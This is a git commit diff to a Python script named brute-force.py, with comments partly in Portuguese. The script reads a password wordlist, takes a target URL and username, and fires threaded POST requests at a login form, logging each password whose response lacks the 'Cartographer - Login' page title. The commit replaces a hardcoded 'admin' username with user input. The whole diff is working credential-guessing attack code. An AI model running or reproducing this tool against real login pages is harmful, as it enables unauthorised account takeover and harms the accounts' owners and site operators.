6a49956cf9fbbc0edfc2ac7a3314e21e981956ce
paulojrb <r7k25ak@gmail.com>
2019-12-17 17:16:05 -0300

    directory

--- py/brute-force.py
+++ py/brute-force.py
@@ -4,11 +4,10 @@ print('* wordlists *')
 os.system('tree -fn ../wordlists/')
 
 file_name = input('wordlist name ~> ')
-#file_name = '../'+file_name
+login = input('username ~> ')
 
 url = input('url ~> ')
 time_request = input('time request ~> ')
-#data_t = json.loads(input('data ~> '))
 
 file = open(file_name, 'r')
 words = list( map(lambda x: x.replace('\n', ''), file.readlines()) )
@@ -16,7 +15,9 @@ words = list( map(lambda x: x.replace('\n', ''), file.readlines()) )
 print('wordlist com {} palavras.'.format(len(words)))
 
 log_file_name = str(datetime.datetime.now().timestamp())
+log_file_name = 'bf-login_'+log_file_name
 print('logfile ~> '+log_file_name)
+
 logging.basicConfig(level=logging.INFO, filename='syslog/'+log_file_name,
     format='%(asctime)s : %(message)s', filemode='w', datefmt='%m/%d %H:%I:%M:%S')
 
@@ -25,11 +26,10 @@ count = 0
 num = int(len(words) / 10)
 valor = 0
 
-def Auth(passwd):
+def Auth(passwd, user):
   try:
-#    passwd = 'leonardo'+passwd
     params['password'] = passwd
-    params['username'] = 'admin'
+    params['username'] = user
     response = requests.post(url, data=params)
     if not 'Cartographer - Login' in response.text:
       logging.info('hit ~> '+passwd)
@@ -50,7 +50,7 @@ for word in words:
   else:
     count+=1
 
-  x = threading.Thread(target=Auth, args=(word,))
+  x = threading.Thread(target=Auth, args=(word,login))
   x.start()
   time.sleep(float(time_request))
 
